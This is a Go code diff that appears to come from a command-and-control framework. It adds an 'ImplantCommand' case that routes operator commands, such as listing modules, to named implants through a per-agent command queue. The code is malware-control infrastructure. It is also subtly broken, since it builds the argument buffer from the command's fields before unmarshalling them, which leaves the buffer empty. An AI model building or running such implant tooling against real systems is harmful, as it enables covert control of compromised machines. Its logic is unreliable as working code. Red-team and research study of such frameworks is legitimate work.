@@ -109,9 +109,43 @@ func RecvEvent() {
 					}
 				}
 			}
-			break
+			break // GET ACTIVE IMPLANTS
+
+		case "ImplantCommand":
+			var ImplantCmd Common.ImplantCommandData
+			var AgentCmd Common.AgentCmd
+			var DataBuf []byte
+
+			for _, str := range ImplantCmd.Args {
+				DataBuf = append(DataBuf, []byte(str+" ")...)
+			}
+
+			err = json.Unmarshal([]byte(NewWSMessage.Message), &ImplantCmd)
+			if err != nil {
+				log.Println("[error] attempting to unmarshal the implant command data", err)
+				continue
+			}
+			switch ImplantCmd.Command {
+			case "lm":
+				AgentCmd.CmdID = Common.CMD_LIST_MODULES
+				AgentCmd.RequestID = 69
+				AgentCmd.DataBuffer = DataBuf
+				break
+				
+			default:
+				break
+			}
+
+			for _, agent := range agent_arr {
+				if agent.Context.Agent_name == ImplantCmd.ImplantName {
+					agent.CmdQue.Enqueue(AgentCmd)
+				}
+			}
+
+			break // IMPLANT COMMAND
+
 		default:
-			break
+			break // DEFAULT
 		}
 	}
 }
